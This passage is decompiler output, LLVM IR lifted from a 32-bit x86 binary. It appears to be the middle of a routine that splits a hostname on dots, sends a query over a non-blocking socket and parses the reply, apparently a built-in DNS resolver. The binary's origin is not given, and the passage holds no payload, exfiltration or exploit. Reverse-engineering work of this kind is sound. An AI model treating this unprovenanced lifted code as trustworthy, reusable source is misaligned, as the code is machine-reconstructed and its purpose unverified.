  %v4_804d882 = phi i32 [ %v4_804d882.pre, %dec_label_pc_804d882.lr.ph ], [ %v0_804d87c, %dec_label_pc_804d87a ]
  %v0_804d882 = phi i32 [ %v0_804d882.pre, %dec_label_pc_804d882.lr.ph ], [ %v1_804d87a, %dec_label_pc_804d87a ]
  %v1_804d882 = inttoptr i32 %v0_804d882 to i8*
  %v2_804d882 = load i8, i8* %v1_804d882, align 1
  %v3_804d882 = zext i8 %v2_804d882 to i32
  %v5_804d882 = and i32 %v4_804d882, -256
  %v6_804d882 = or i32 %v3_804d882, %v5_804d882
  store i32 %v6_804d882, i32* %edx.global-to-local, align 4
  %v10_804d884 = icmp ne i8 %v2_804d882, 46
  %v4_804d889 = icmp eq i8 %v2_804d882, 0
  %v1_804d88b = icmp eq i1 %v4_804d889, false
  %or.cond = and i1 %v10_804d884, %v1_804d88b
  br i1 %or.cond, label %dec_label_pc_804d874, label %dec_label_pc_804d88d

dec_label_pc_804d88d:                             ; preds = %dec_label_pc_804d882
  %v0_804d88d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804d891 = trunc i32 %v0_804d88d to i8
  %v2_804d891 = load i32, i32* %edi.global-to-local, align 4
  %v3_804d891 = inttoptr i32 %v2_804d891 to i8*
  store i8 %v1_804d891, i8* %v3_804d891, align 1
  %v0_804d893 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d893 = add i32 %v0_804d893, 1
  store i32 %v1_804d893, i32* %edx.global-to-local, align 4
  store i32 %v0_804d893, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d87a

dec_label_pc_804d89a:                             ; preds = %dec_label_pc_804d87a, %dec_label_pc_804d830
  %v0_804d89d = phi i32 [ %v2_804d863, %dec_label_pc_804d830 ], [ %v0_804d87c, %dec_label_pc_804d87a ]
  %v1_804d89d = inttoptr i32 %v0_804d89d to i8*
  store i8 0, i8* %v1_804d89d, align 1
  store i32 %v2_804d850, i32* %eax.global-to-local, align 4
  %v3_804d8a5 = call i32 @function_8050fc0(i8* %tmp104)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804d8b9 = add i32 %v3_804d8a5, %v2_804d850
  store i32 %v2_804d8b9, i32* @edi, align 4
  %v1_804d8dd = add i32 %v2_804d8b9, 1
  store i32 %v1_804d8dd, i32* @ebx, align 4
  store i32 %v2_804d850, i32* %eax.global-to-local, align 4
  %v3_804d8e5 = call i32 @function_8050fc0(i8* %tmp104)
  %v1_804d8ea = add i32 %v3_804d8e5, 17
  store i32 %v1_804d8ea, i32* %eax.global-to-local, align 4
  %v1_804d8f1 = call i32 @function_804d5c0(i32 %v1_804d8ea)
  %v2_804d8ff = udiv i32 %v1_804d8f1, 65535
  store i32 %v2_804d8ff, i32* %edx.global-to-local, align 4
  %v2_804d90981 = add i32 %v2_804d8ff, %v1_804d8f1
  store i32 %v2_804d90981, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804d919 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d919, i32* %ecx.global-to-local, align 4
  %v3_804d921 = call i32 @function_8051050(i32 %v2_804d919, i32 16)
  store i32 %v3_804d921, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804d969 = load i32, i32* @edi, align 4
  %v1_804d969 = add i32 %v0_804d969, 1
  %v2_804d969 = inttoptr i32 %v1_804d969 to i16*
  store i16 256, i16* %v2_804d969, align 2
  %v0_804d972 = load i32, i32* @ebx, align 4
  %v1_804d972 = add i32 %v0_804d972, 2
  %v2_804d972 = inttoptr i32 %v1_804d972 to i16*
  store i16 256, i16* %v2_804d972, align 2
  %v0_804d978 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804d978 = icmp eq i32 %v0_804d978, -1
  br i1 %v10_804d978, label %dec_label_pc_804d98c.preheader, label %dec_label_pc_804d980

dec_label_pc_804d980.loopexit:                    ; preds = %dec_label_pc_804daa5
  %v0_804d983.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d980

dec_label_pc_804d980:                             ; preds = %dec_label_pc_804d980.loopexit, %dec_label_pc_804d89a
  %v0_804d983 = phi i32 [ %v0_804d983.pre, %dec_label_pc_804d980.loopexit ], [ %v0_804d978, %dec_label_pc_804d89a ]
  %v0_804d980 = load i32, i32* @esp, align 4
  %v2_804d983 = add i32 %v0_804d980, -16
  %v3_804d983 = inttoptr i32 %v2_804d983 to i32*
  store i32 %v0_804d983, i32* %v3_804d983, align 4
  %v1_804d984 = call i32 @function_80514e3(i32 1)
  store i32 %v1_804d984, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d98c.preheader

dec_label_pc_804d98c.preheader:                   ; preds = %dec_label_pc_804d980, %dec_label_pc_804d89a
  br label %dec_label_pc_804d98c

dec_label_pc_804d98c:                             ; preds = %dec_label_pc_804d98c.preheader, %dec_label_pc_804daa5
  %v0_804d98c = load i32, i32* @ebx, align 4
  %v1_804d98c = load i32, i32* @esp, align 4
  %v2_804d98c = add i32 %v1_804d98c, -4
  %v3_804d98c = inttoptr i32 %v2_804d98c to i32*
  store i32 %v0_804d98c, i32* %v3_804d98c, align 4
  %v1_804d98d = add i32 %v1_804d98c, -8
  %v2_804d98d = inttoptr i32 %v1_804d98d to i32*
  store i32 0, i32* %v2_804d98d, align 4
  %v1_804d98f = add i32 %v1_804d98c, -12
  %v2_804d98f = inttoptr i32 %v1_804d98f to i32*
  store i32 2, i32* %v2_804d98f, align 4
  %v1_804d991 = add i32 %v1_804d98c, -16
  %v2_804d991 = inttoptr i32 %v1_804d991 to i32*
  store i32 2, i32* %v2_804d991, align 4
  %v4_804d993 = call i32 @function_8051cc7(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d993, i32* %eax.global-to-local, align 4
  %v0_804d998 = load i32, i32* @esp, align 4
  store i32 %v4_804d993, i32* @ebp, align 4
  %v10_804d99d = icmp eq i32 %v4_804d993, -1
  br i1 %v10_804d99d, label %dec_label_pc_804dac0, label %dec_label_pc_804d9a6

dec_label_pc_804d9a6:                             ; preds = %dec_label_pc_804d98c
  %v0_804d9a6 = load i32, i32* @ecx, align 4
  %v2_804d9a6 = add i32 %v0_804d998, 12
  %v3_804d9a6 = inttoptr i32 %v2_804d9a6 to i32*
  store i32 %v0_804d9a6, i32* %v3_804d9a6, align 4
  %v1_804d9a7 = add i32 %v0_804d998, 8
  %v2_804d9a7 = inttoptr i32 %v1_804d9a7 to i32*
  store i32 16, i32* %v2_804d9a7, align 4
  %v1_804d9a9 = add i32 %v0_804d998, 4272
  store i32 %v1_804d9a9, i32* @edi, align 4
  %v2_804d9b0 = add i32 %v0_804d998, 4
  %v3_804d9b0 = inttoptr i32 %v2_804d9b0 to i32*
  store i32 %v1_804d9a9, i32* %v3_804d9b0, align 4
  %v3_804d9b1 = inttoptr i32 %v0_804d998 to i32*
  store i32 %v4_804d993, i32* %v3_804d9b1, align 4
  %v3_804d9b2 = call i32 @function_8051aec(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d9b7 = load i32, i32* @esp, align 4
  %v1_804d9ba = add i32 %v3_804d9b2, 1
  %v8_804d9ba = icmp eq i32 %v1_804d9ba, 0
  store i32 %v1_804d9ba, i32* %eax.global-to-local, align 4
  br i1 %v8_804d9ba, label %dec_label_pc_804dac0, label %dec_label_pc_804d9c1

dec_label_pc_804d9c1:                             ; preds = %dec_label_pc_804d9a6
  %v1_804d9c1 = add i32 %v0_804d9b7, 12
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 16384, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9b7, 20
  %v2_804d9c6 = inttoptr i32 %v1_804d9c6 to i32*
  %v3_804d9c6 = load i32, i32* %v2_804d9c6, align 4
  store i32 %v3_804d9c6, i32* %edx.global-to-local, align 4
  %v2_804d9ca = add i32 %v0_804d9b7, 8
  %v3_804d9ca = inttoptr i32 %v2_804d9ca to i32*
  store i32 %v3_804d9c6, i32* %v3_804d9ca, align 4
  %v1_804d9cb = add i32 %v0_804d9b7, 2096
  store i32 %v1_804d9cb, i32* %eax.global-to-local, align 4
  %v2_804d9d2 = add i32 %v0_804d9b7, 4
  %v3_804d9d2 = inttoptr i32 %v2_804d9d2 to i32*
  store i32 %v1_804d9cb, i32* %v3_804d9d2, align 4
  %v0_804d9d3 = load i32, i32* @ebp, align 4
  %v3_804d9d3 = inttoptr i32 %v0_804d9b7 to i32*
  store i32 %v0_804d9d3, i32* %v3_804d9d3, align 4
  %v0_804d9d4 = call i32 @function_8051c16()
  %v0_804d9d9 = load i32, i32* @esp, align 4
  %v1_804d9dc = add i32 %v0_804d9d4, 1
  %v8_804d9dc = icmp eq i32 %v1_804d9dc, 0
  store i32 %v1_804d9dc, i32* %eax.global-to-local, align 4
  br i1 %v8_804d9dc, label %dec_label_pc_804dac0, label %dec_label_pc_804d9e3

dec_label_pc_804d9e3:                             ; preds = %dec_label_pc_804d9c1
  %v2_804d9e3 = add i32 %v0_804d9d9, 12
  %v3_804d9e3 = inttoptr i32 %v2_804d9e3 to i32*
  store i32 %v1_804d9dc, i32* %v3_804d9e3, align 4
  %v1_804d9e4 = add i32 %v0_804d9d9, 8
  %v2_804d9e4 = inttoptr i32 %v1_804d9e4 to i32*
  store i32 0, i32* %v2_804d9e4, align 4
  %v0_804d9e6 = load i32, i32* @ebp, align 4
  %v2_804d9e6 = add i32 %v0_804d9d9, 4
  %v3_804d9e6 = inttoptr i32 %v2_804d9e6 to i32*
  store i32 %v0_804d9e6, i32* %v3_804d9e6, align 4
  %v2_804d9e7 = inttoptr i32 %v0_804d9d9 to i32*
  store i32 3, i32* %v2_804d9e7, align 4
  %v3_804d9e9 = call i32 @function_805144d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d9ee = load i32, i32* @esp, align 4
  %v12_804d9f1 = or i32 %v3_804d9e9, 2048
  store i32 %v12_804d9f1, i32* %eax.global-to-local, align 4
  %v2_804d9f4 = add i32 %v0_804d9ee, 8
  %v3_804d9f4 = inttoptr i32 %v2_804d9f4 to i32*
  store i32 %v12_804d9f1, i32* %v3_804d9f4, align 4
  %v0_804d9f5 = load i32, i32* @ebp, align 4
  %v2_804d9f5 = add i32 %v0_804d9ee, 4
  %v3_804d9f5 = inttoptr i32 %v2_804d9f5 to i32*
  store i32 %v0_804d9f5, i32* %v3_804d9f5, align 4
  %v2_804d9f6 = inttoptr i32 %v0_804d9ee to i32*
  store i32 4, i32* %v2_804d9f6, align 4
  %v3_804d9f8 = call i32 @function_805144d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d9fd = load i32, i32* @esp, align 4
  %v1_804d9fd = add i32 %v0_804d9fd, 4144
  store i32 %v1_804d9fd, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804da0b = inttoptr i32 %v1_804d9fd to i8*
  store i32 %v1_804d9fd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804da0e = call i8* @_memset(i8* %v1_804da0b, i32 0, i32 32)
  %v6_804da0e = ptrtoint i8* %v5_804da0e to i32
  store i32 %v6_804da0e, i32* %ecx.global-to-local, align 4
  %v0_804da10 = load i32, i32* @ebp, align 4
  %v2_804da14 = udiv i32 %v0_804da10, 32
  store i32 %v2_804da14, i32* @esi, align 4
  %v1_804da17 = urem i32 %v0_804da10, 32
  store i32 %v1_804da17, i32* @ebx, align 4
  %v0_804da1a = load i32, i32* @esp, align 4
  %v2_804da1a = mul nuw nsw i32 %v2_804da14, 4
  %v3_804da1a = add nuw nsw i32 %v2_804da1a, 4144
  %v4_804da1a = add i32 %v3_804da1a, %v0_804da1a
  %v5_804da1a = inttoptr i32 %v4_804da1a to i32*
  %v6_804da1a = load i32, i32* %v5_804da1a, align 4
  %v9_804da1a = shl i32 1, %v1_804da17
  %v12_804da1a = or i32 %v6_804da1a, %v9_804da1a
  store i32 %v12_804da1a, i32* %v5_804da1a, align 4
  %v0_804da22 = load i32, i32* @esp, align 4
  %v1_804da22 = add i32 %v0_804da22, 4288
  %v2_804da22 = inttoptr i32 %v1_804da22 to i32*
  store i32 5, i32* %v2_804da22, align 4
  %v0_804da2d = load i32, i32* @esp, align 4
  %v1_804da2d = add i32 %v0_804da2d, 4292
  %v2_804da2d = inttoptr i32 %v1_804da2d to i32*
  store i32 0, i32* %v2_804da2d, align 4
  %v0_804da38 = load i32, i32* @esp, align 4
  %v1_804da38 = inttoptr i32 %v0_804da38 to i32*
  %v1_804da39 = add i32 %v0_804da38, 4288
  store i32 %v1_804da39, i32* %v1_804da38, align 4
  %v0_804da41 = load i32, i32* @ebp, align 4
  %v1_804da41 = add i32 %v0_804da41, 1
  store i32 %v1_804da41, i32* %eax.global-to-local, align 4
  %v1_804da44 = add i32 %v0_804da38, -4
  %v2_804da44 = inttoptr i32 %v1_804da44 to i32*
  store i32 0, i32* %v2_804da44, align 4
  %v1_804da46 = add i32 %v0_804da38, -8
  %v2_804da46 = inttoptr i32 %v1_804da46 to i32*
  store i32 0, i32* %v2_804da46, align 4
  %v0_804da48 = load i32, i32* %edx.global-to-local, align 4
  %v2_804da48 = add i32 %v0_804da38, -12
  %v3_804da48 = inttoptr i32 %v2_804da48 to i32*
  store i32 %v0_804da48, i32* %v3_804da48, align 4
  %v0_804da49 = load i32, i32* %eax.global-to-local, align 4
  %v2_804da49 = add i32 %v0_804da38, -16
  %v3_804da49 = inttoptr i32 %v2_804da49 to i32*
  store i32 %v0_804da49, i32* %v3_804da49, align 4
  %v0_804da4a = call i32 @function_80516ea()
  store i32 %v0_804da4a, i32* %eax.global-to-local, align 4
  %v0_804da4f = load i32, i32* @esp, align 4
  %v1_804da4f = add i32 %v0_804da4f, 32
  switch i32 %v0_804da4a, label %dec_label_pc_804da5b [
    i32 -1, label %dec_label_pc_804dad4
    i32 0, label %dec_label_pc_804da9e
  ]

dec_label_pc_804da5b:                             ; preds = %dec_label_pc_804d9e3
  %v1_804da5b = load i32, i32* @esi, align 4
  %v2_804da5b = mul i32 %v1_804da5b, 4
  %v3_804da5b = add i32 %v0_804da4f, 4160
  %v4_804da5b = add i32 %v3_804da5b, %v2_804da5b
  %v5_804da5b = inttoptr i32 %v4_804da5b to i32*
  %v6_804da5b = load i32, i32* %v5_804da5b, align 4
  %v7_804da5b = load i32, i32* @ebx, align 4
  %v8_804da5b = urem i32 %v7_804da5b, 32
  %v9_804da5b = shl i32 1, %v8_804da5b
  %v10_804da5b = and i32 %v9_804da5b, %v6_804da5b
  %v11_804da5b = icmp ne i32 %v10_804da5b, 0
  %v1_804da63 = zext i1 %v11_804da5b to i32
  %v3_804da63 = and i32 %v0_804da4a, -256
  %v4_804da63 = or i32 %v1_804da63, %v3_804da63
  store i32 %v4_804da63, i32* %eax.global-to-local, align 4
  %v4_804da66 = icmp eq i1 %v11_804da5b, false
  br i1 %v4_804da66, label %dec_label_pc_804dad4, label %dec_label_pc_804da6a

dec_label_pc_804da6a:                             ; preds = %dec_label_pc_804da5b
  %v2_804da6a = add i32 %v0_804da4f, 28
  %v3_804da6a = inttoptr i32 %v2_804da6a to i32*
  store i32 %v4_804da63, i32* %v3_804da6a, align 4
  %v0_804da6b = load i32, i32* %eax.global-to-local, align 4
  %v2_804da6b = add i32 %v0_804da4f, 24
  %v3_804da6b = inttoptr i32 %v2_804da6b to i32*
  store i32 %v0_804da6b, i32* %v3_804da6b, align 4
  %v1_804da6c = add i32 %v0_804da4f, 20
  %v2_804da6c = inttoptr i32 %v1_804da6c to i32*
  store i32 0, i32* %v2_804da6c, align 4
  %v1_804da6e = add i32 %v0_804da4f, 16
  %v2_804da6e = inttoptr i32 %v1_804da6e to i32*
  store i32 0, i32* %v2_804da6e, align 4
  %v1_804da70 = add i32 %v0_804da4f, 12
  %v2_804da70 = inttoptr i32 %v1_804da70 to i32*
  store i32 16384, i32* %v2_804da70, align 4
  %v1_804da75 = add i32 %v0_804da4f, 8
  %v2_804da75 = inttoptr i32 %v1_804da75 to i32*
  store i32 2048, i32* %v2_804da75, align 4
  %v1_804da7a = add i32 %v0_804da4f, 64
  store i32 %v1_804da7a, i32* %eax.global-to-local, align 4
  %v2_804da7e = add i32 %v0_804da4f, 4
  %v3_804da7e = inttoptr i32 %v2_804da7e to i32*
  store i32 %v1_804da7a, i32* %v3_804da7e, align 4
  %v0_804da7f = load i32, i32* @ebp, align 4
  %v3_804da7f = inttoptr i32 %v0_804da4f to i32*
  store i32 %v0_804da7f, i32* %v3_804da7f, align 4
  %v0_804da80 = call i32 @function_8051bd3()
  store i32 %v0_804da80, i32* %eax.global-to-local, align 4
  %v0_804da85 = load i32, i32* @esp, align 4
  store i32 %v0_804da80, i32* @ebx, align 4
  %v1_804da8a = add i32 %v0_804da85, 56
  %v2_804da8a = inttoptr i32 %v1_804da8a to i32*
  %v3_804da8a = load i32, i32* %v2_804da8a, align 4
  store i32 %v3_804da8a, i32* %eax.global-to-local, align 4
  %v2_804da8e = add i32 %v0_804da85, 16
  %v3_804da8e = inttoptr i32 %v2_804da8e to i32*
  store i32 %v3_804da8a, i32* %v3_804da8e, align 4
  %v2_804da8f = call i32 @function_8050fc0(i8* inttoptr (i32 1 to i8*))
  %v1_804da94 = add i32 %v2_804da8f, 17
  store i32 %v1_804da94, i32* %eax.global-to-local, align 4
  %v0_804da97 = load i32, i32* @esp, align 4
  %v1_804da97 = add i32 %v0_804da97, 16
  %v0_804da9a = load i32, i32* @ebx, align 4
  %v7_804da9a = icmp ult i32 %v0_804da9a, %v1_804da94
  %v1_804da9c = icmp eq i1 %v7_804da9a, false
  br i1 %v1_804da9c, label %dec_label_pc_804dafa, label %dec_label_pc_804da9e

dec_label_pc_804da9e:                             ; preds = %dec_label_pc_804d9e3, %dec_label_pc_804db26, %dec_label_pc_804dafa, %dec_label_pc_804da6a
  %v0_804da9e = phi i32 [ %v1_804db13, %dec_label_pc_804db26 ], [ %v1_804db13, %dec_label_pc_804dafa ], [ %v1_804da97, %dec_label_pc_804da6a ], [ %v1_804da4f, %dec_label_pc_804d9e3 ]
  %v1_804da9e = add i32 %v0_804da9e, 8
  %v2_804da9e = inttoptr i32 %v1_804da9e to i32*
  %v3_804da9e = load i32, i32* %v2_804da9e, align 4
  %v12_804da9e = icmp eq i32 %v3_804da9e, 5
  br i1 %v12_804da9e, label %dec_label_pc_804dad4, label %dec_label_pc_804daa5

dec_label_pc_804daa5:                             ; preds = %dec_label_pc_804dac0, %dec_label_pc_804da9e
  %v3_804daa5 = phi i32 [ %v3_804dacd, %dec_label_pc_804dac0 ], [ %v3_804da9e, %dec_label_pc_804da9e ]
  %v1_804daad = phi i32 [ %v1_804daca, %dec_label_pc_804dac0 ], [ %v0_804da9e, %dec_label_pc_804da9e ]
  %v1_804daa5 = add i32 %v1_804daad, 8
  %v2_804daa5 = inttoptr i32 %v1_804daa5 to i32*
  %v1_804daa9 = add i32 %v3_804daa5, 1
  store i32 %v1_804daa9, i32* @edi, align 4
  %v0_804daaa = load i32, i32* @ebp, align 4
  %v10_804daaa = icmp eq i32 %v0_804daaa, -1
  store i32 %v1_804daa9, i32* %v2_804daa5, align 4
  %v1_804dab1 = icmp eq i1 %v10_804daaa, false
  br i1 %v1_804dab1, label %dec_label_pc_804d980.loopexit, label %dec_label_pc_804d98c

dec_label_pc_804dac0:                             ; preds = %dec_label_pc_804d9c1, %dec_label_pc_804d9a6, %dec_label_pc_804d98c
  %v0_804dac0.in = phi i32 [ %v0_804d9d9, %dec_label_pc_804d9c1 ], [ %v0_804d9b7, %dec_label_pc_804d9a6 ], [ %v0_804d998, %dec_label_pc_804d98c ]
  %v2_804dac3 = inttoptr i32 %v0_804dac0.in to i32*
  store i32 1, i32* %v2_804dac3, align 4
  %v0_804dac5 = call i32 @function_805306a()
  store i32 %v0_804dac5, i32* %eax.global-to-local, align 4
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804daca = add i32 %v0_804daca, 16
  %v1_804dacd = add i32 %v0_804daca, 24
  %v2_804dacd = inttoptr i32 %v1_804dacd to i32*
  %v3_804dacd = load i32, i32* %v2_804dacd, align 4
  %v12_804dacd = icmp eq i32 %v3_804dacd, 5
  %v1_804dad2 = icmp eq i1 %v12_804dacd, false
  br i1 %v1_804dad2, label %dec_label_pc_804daa5, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804d9e3, %dec_label_pc_804dac0, %dec_label_pc_804da9e, %dec_label_pc_804da5b, %dec_label_pc_804db34, %dec_label_pc_804db3d.backedge
  %v0_804dad4 = phi i32 [ %v0_804db42124, %dec_label_pc_804db34 ], [ %v0_804db42, %dec_label_pc_804db3d.backedge ], [ %v1_804daca, %dec_label_pc_804dac0 ], [ %v0_804da9e, %dec_label_pc_804da9e ], [ %v1_804da4f, %dec_label_pc_804da5b ], [ %v1_804da4f, %dec_label_pc_804d9e3 ]
  %v0_804dad7 = load i32, i32* @ebp, align 4
  %v2_804dad7 = add i32 %v0_804dad4, -16
  %v3_804dad7 = inttoptr i32 %v2_804dad7 to i32*
  store i32 %v0_804dad7, i32* %v3_804dad7, align 4
  %v1_804dad8 = call i32 @function_80514e3(i32 1)
  store i32 %v1_804dad8, i32* %eax.global-to-local, align 4
  %v0_804dadd = load i32, i32* @esp, align 4
  %v1_804dadd = add i32 %v0_804dadd, 16
  %v1_804dae0 = inttoptr i32 %v1_804dadd to i32*
  %v2_804dae0 = load i32, i32* %v1_804dae0, align 4
  store i32 %v2_804dae0, i32* @edx, align 4
  %v1_804dae3 = inttoptr i32 %v2_804dae0 to i8*
  %v2_804dae3 = load i8, i8* %v1_804dae3, align 1
  %v3_804dae3 = icmp eq i8 %v2_804dae3, 0
  br i1 %v3_804dae3, label %dec_label_pc_804dbe3, label %dec_label_pc_804daec

dec_label_pc_804daec:                             ; preds = %dec_label_pc_804dad4
  %v2_804daec = load i32, i32* %v1_804dae0, align 4
  store i32 %v2_804daec, i32* %eax.global-to-local, align 4
  %v1_804daef = add i32 %v0_804dadd, 4300
  %v1_804daf5 = inttoptr i32 %v1_804daef to i32*
  %v2_804daf5 = load i32, i32* %v1_804daf5, align 4
  store i32 %v2_804daf5, i32* @ebx, align 4
  %v3_804daf6 = add i32 %v0_804dadd, 4308
  %v1_804daf7 = inttoptr i32 %v3_804daf6 to i32*
  %v2_804daf7 = load i32, i32* %v1_804daf7, align 4
  store i32 %v2_804daf7, i32* @edi, align 4
  %v3_804daf7 = add i32 %v0_804dadd, 4312
  %v1_804daf8 = inttoptr i32 %v3_804daf7 to i32*
  %v2_804daf8 = load i32, i32* %v1_804daf8, align 4
  store i32 %v2_804daf8, i32* @ebp, align 4
  ret i32 %v2_804daec

dec_label_pc_804dafa:                             ; preds = %dec_label_pc_804da6a
  %v1_804dafa = add i32 %v0_804da97, 60
  store i32 %v1_804dafa, i32* %edx.global-to-local, align 4
  %v2_804dafe = add i32 %v0_804da97, 40
  %v3_804dafe = inttoptr i32 %v2_804dafe to i32*
  store i32 %v1_804dafa, i32* %v3_804dafe, align 4
  %v0_804db02 = load i32, i32* @esp, align 4
  %v1_804db05 = add i32 %v0_804db02, 44
  store i32 %v1_804db05, i32* %ecx.global-to-local, align 4
  %v2_804db09 = add i32 %v0_804db02, -16
  %v3_804db09 = inttoptr i32 %v2_804db09 to i32*
  store i32 %v1_804db05, i32* %v3_804db09, align 4
  %v2_804db0a = call i32 @function_8050fc0(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804db0a, i32* %eax.global-to-local, align 4
  %v0_804db0f = load i32, i32* @esp, align 4
  %v2_804db0f = add i32 %v2_804db0a, 65
  %v3_804db0f = add i32 %v2_804db0f, %v0_804db0f
  store i32 %v3_804db0f, i32* %ecx.global-to-local, align 4
  %v1_804db13 = add i32 %v0_804db0f, 16
  %v1_804db16 = add i32 %v0_804db0f, 30
  %v2_804db16 = inttoptr i32 %v1_804db16 to i16*
  %v3_804db16 = load i16, i16* %v2_804db16, align 2
  %v4_804db16 = zext i16 %v3_804db16 to i32
  %v7_804db16 = and i32 %v1_804d9fd, -65536
  %v8_804db16 = or i32 %v4_804db16, %v7_804db16
  store i32 %v8_804db16, i32* @edi, align 4
  %v3_804db1b = add i32 %v0_804db0f, 48
  %v4_804db1b = inttoptr i32 %v3_804db1b to i16*
  %v5_804db1b = load i16, i16* %v4_804db1b, align 2
  %v16_804db1b = icmp eq i16 %v3_804db16, %v5_804db1b
  %v1_804db20 = icmp eq i1 %v16_804db1b, false
  br i1 %v1_804db20, label %dec_label_pc_804da9e, label %dec_label_pc_804db26

dec_label_pc_804db26:                             ; preds = %dec_label_pc_804dafa
  %v1_804db26 = add i32 %v0_804db0f, 54
  %v2_804db26 = inttoptr i32 %v1_804db26 to i16*
  %v3_804db26 = load i16, i16* %v2_804db26, align 2
  %v4_804db26 = zext i16 %v3_804db26 to i32
  %v6_804db26 = and i32 %v2_804db0a, -65536
  %v7_804db26 = or i32 %v4_804db26, %v6_804db26
  store i32 %v7_804db26, i32* %eax.global-to-local, align 4
  %v4_804db2b = icmp eq i16 %v3_804db26, 0
  br i1 %v4_804db2b, label %dec_label_pc_804da9e, label %dec_label_pc_804db34

dec_label_pc_804db34:                             ; preds = %dec_label_pc_804db26
  %v2_804db34 = call i16 @llvm.bswap.i16(i16 %v3_804db26)
  %v3_804db34 = zext i16 %v2_804db34 to i32
  %v6_804db34 = or i32 %v3_804db34, %v6_804db26
  store i32 %v6_804db34, i32* %eax.global-to-local, align 4
  %v3_804db38 = add i32 %v0_804db0f, 38
  %v4_804db38 = inttoptr i32 %v3_804db38 to i16*
  store i16 %v2_804db34, i16* %v4_804db38, align 2
  %v0_804db3d119 = load i32, i32* @esp, align 4
  %v1_804db3d120 = add i32 %v0_804db3d119, 22
  %v2_804db3d121 = inttoptr i32 %v1_804db3d120 to i16*
  %v3_804db3d122 = load i16, i16* %v2_804db3d121, align 2
  %v4_804db3d123 = add i16 %v3_804db3d122, -1
  store i16 %v4_804db3d123, i16* %v2_804db3d121, align 2
  %v0_804db42124 = load i32, i32* @esp, align 4
  %v1_804db42125 = add i32 %v0_804db42124, 22
  %v2_804db42126 = inttoptr i32 %v1_804db42125 to i16*
  %v3_804db42127 = load i16, i16* %v2_804db42126, align 2
  %v13_804db42128 = icmp eq i16 %v3_804db42127, -1
  br i1 %v13_804db42128, label %dec_label_pc_804dad4, label %dec_label_pc_804db4a

dec_label_pc_804db4a:                             ; preds = %dec_label_pc_804db34, %dec_label_pc_804db3d.backedge
  %v0_804db42129 = phi i32 [ %v0_804db42, %dec_label_pc_804db3d.backedge ], [ %v0_804db42124, %dec_label_pc_804db34 ]
  %v0_804db4a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804db4a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804db5313 = inttoptr i32 %v0_804db4a to i8*
  %v2_804db5314 = load i8, i8* %v1_804db5313, align 1
  %v3_804db5315 = zext i8 %v2_804db5314 to i32
  %v4_804db5316 = load i32, i32* %eax.global-to-local, align 4
  %v5_804db5317 = and i32 %v4_804db5316, -256
  %v6_804db5318 = or i32 %v5_804db5317, %v3_804db5315
  store i32 %v6_804db5318, i32* %eax.global-to-local, align 4
  %v4_804db5519 = icmp eq i8 %v2_804db5314, 0
  br i1 %v4_804db5519, label %dec_label_pc_804db8a, label %dec_label_pc_804db59.preheader.preheader

dec_label_pc_804db59.preheader.preheader:         ; preds = %dec_label_pc_804db4a
  %v1_804db7e = add i32 %v0_804db42129, 32
  br label %dec_label_pc_804db59.preheader

dec_label_pc_804db59.preheader:                   ; preds = %dec_label_pc_804db59.preheader.preheader, %dec_label_pc_804dc1c
  %v0_804dc20 = phi i32 [ %v3_804dc20, %dec_label_pc_804dc1c ], [ 1, %dec_label_pc_804db59.preheader.preheader ]
  %v0_804dc1d45 = phi i32 [ %v0_804dc1d, %dec_label_pc_804dc1c ], [ 0, %dec_label_pc_804db59.preheader.preheader ]
  %v0_804db6641 = phi i32 [ %v1_804dc1c, %dec_label_pc_804dc1c ], [ %v0_804db4a, %dec_label_pc_804db59.preheader.preheader ]
  %v0_804db5939 = phi i32 [ %v6_804db53, %dec_label_pc_804dc1c ], [ %v6_804db5318, %dec_label_pc_804db59.preheader.preheader ]
  br label %dec_label_pc_804db59

dec_label_pc_804db59:                             ; preds = %dec_label_pc_804db59.preheader, %dec_label_pc_804db61
  %v0_804dc1d = phi i32 [ %v0_804dc1d45, %dec_label_pc_804db59.preheader ], [ 1, %dec_label_pc_804db61 ]
  %v0_804dc1c = phi i32 [ %v0_804db6641, %dec_label_pc_804db59.preheader ], [ %v2_804db82, %dec_label_pc_804db61 ]
  %v4_804db53 = phi i32 [ %v0_804db5939, %dec_label_pc_804db59.preheader ], [ %v6_804db84, %dec_label_pc_804db61 ]
  %v1_804db59 = trunc i32 %v4_804db53 to i8
  %tmp141 = icmp ult i8 %v1_804db59, -64
  br i1 %tmp141, label %dec_label_pc_804dc1c, label %dec_label_pc_804db61

dec_label_pc_804db61:                             ; preds = %dec_label_pc_804db59
  %v1_804db61 = urem i32 %v4_804db53, 256
  store i32 %v1_804db61, i32* %eax.global-to-local, align 4
  %v1_804db66 = add i32 %v0_804dc1c, 1
  %v2_804db66 = inttoptr i32 %v1_804db66 to i8*
  %v3_804db66 = load i8, i8* %v2_804db66, align 1
